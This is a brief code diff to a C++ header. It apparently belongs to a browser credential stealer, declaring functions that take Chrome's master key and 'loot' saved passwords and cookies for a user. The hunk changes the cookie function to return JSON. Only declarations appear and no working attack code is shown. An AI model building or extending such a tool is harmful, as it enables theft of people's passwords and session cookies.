@@ -10,7 +10,7 @@ const int MASTER_KEY_SIZE = 32;
 
 void getMasterKey(unsigned char* masterKey, std::string userName);
 json lootChromePasswords(const unsigned char* masterKey, std::string userName);
-void lootChromeCookies(const unsigned char* masterKey, std::string userName, char* writePath);
+json lootChromeCookies(const unsigned char* masterKey, std::string userName);
 
 // Utilities
 void printUCharAsHex(unsigned char* uChar, int len);
